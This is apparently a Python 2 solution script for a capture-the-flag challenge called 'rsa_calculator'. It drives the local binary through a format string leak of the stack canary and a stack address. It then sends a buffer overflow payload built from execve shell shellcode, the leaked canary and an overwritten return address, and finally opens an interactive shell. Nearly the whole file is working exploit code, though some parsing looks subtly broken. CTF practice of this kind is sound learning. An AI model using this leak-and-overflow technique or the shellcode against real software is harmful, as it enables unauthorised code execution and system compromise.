import random
import struct
import sys
import subprocess
import time
import fcntl
import os

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = ps.stdout.read(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]

def is_prime(p):
    if(p==2): return True
    if(not(p&1)): return False
    return pow(2,p-1,p)==1


def find_prime(min_range, max_range):
    primes = [i for i in range(min_range, max_range) if is_prime(i)]
    return random.choice(primes)

def muliplicative_inverse(phi, e):
    d = 1
    while(((d*e)%phi) != 1):
        d+=1
    return d

def get_RSA_values():
    p = find_prime(100, 1000)
    q = find_prime(100, 1000)

    phi = (p-1)*(q-1)
    N = p*q

    e = find_prime(0, phi)
    while((phi%e) == 0):
        e = find_prime(0, phi)

    d = muliplicative_inverse(phi, e)

    print 'p = {0}\nq = {1}\ne = {2}\nd = {3}\nphi = {4}'.format(p,q,e,d,phi)
    return p,q,e,d


if __name__ == '__main__':

    shellcode = "\x31\xf6\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

    ps = subprocess.Popen(['/home/raw/Documents/pwnable/rookis/rsa_calculator/rsa_calculator'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    # First set RSA key
    # p,q,e,d = get_RSA_values() bug in pwnable binary using hardcoded working values
    p = 103
    q = 173
    e = 8537
    d = 10937
    read_until('>')
    ps.stdin.write('1\n')
    read_until(':')
    ps.stdin.write(str(p)+'\n')
    read_until(':')
    ps.stdin.write(str(q)+'\n')
    read_until('e :')
    ps.stdin.write(str(e)+'\n')
    read_until('d :')
    ps.stdin.write(str(d)+'\n')
    read_until('>')


    # Now use format string vulenrability in decryption code to read canary value
    ps.stdin.write('3\n')
    read_until(':')
    ps.stdin.write('1024\n')
    read_until('data')
    ps.stdin.write('c30800005a090000e90500009e1300000b4100001d0e0000d2220000c30800005a090000e9050000e03200000b4100001d0e0000\n') # determined previously (%205$p.$208$p)
    read_until('result -\n')
    output = ps.stdout.readline()
    canary = int(output[0],16)
    stack_position = int(output[1],16)-1808 # 0x10+0x10+0x610 mains_frame+saved_frame+0x610
    print 'canary ->' + hex(canary)
    print 'stack pos ->' + hex(stack_position+1808)
    print 'stack pos ->' + hex(stack_position)
    read_until('>')

    ### need encrypted shellcode
    ##ps.stdin.write('2\n')
    ##read_until(':')
    ##ps.stdin.write('1024\n')
    ##read_until('data')
    ##ps.stdin.write("A"*8 + shellcode + '\n')
    ##read_until('-\n')
    ##encrypted_shellcode = ps.stdout.readline()
    ##encrypted_shellcode = encrypted_shellcode[:-1]# remove \x00
    ##print encrypted_shellcode
    ##read_until('>')

    # trigger unsigned int bug to overflow and overwrite return address
    payload = shellcode# remove null byte
    payload += 'A'*(0x610-len(shellcode) -8)
    payload += struct.pack('<Q', canary)
    payload += 'A'*8
    payload += struct.pack('<Q', stack_position)
    ps.stdin.write('3\n')
    read_until(':')
    ps.stdin.write('-1\n')
    read_until('data')
    ps.stdin.write(payload +'\n')

    fd = ps.stdout.fileno()
    fl = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

    while(True):
        try:
            time.sleep(0.1)
            sys.stdout.write(ps.stdout.read())
        except:
            ps.stdin.write(raw_input() + '\n')
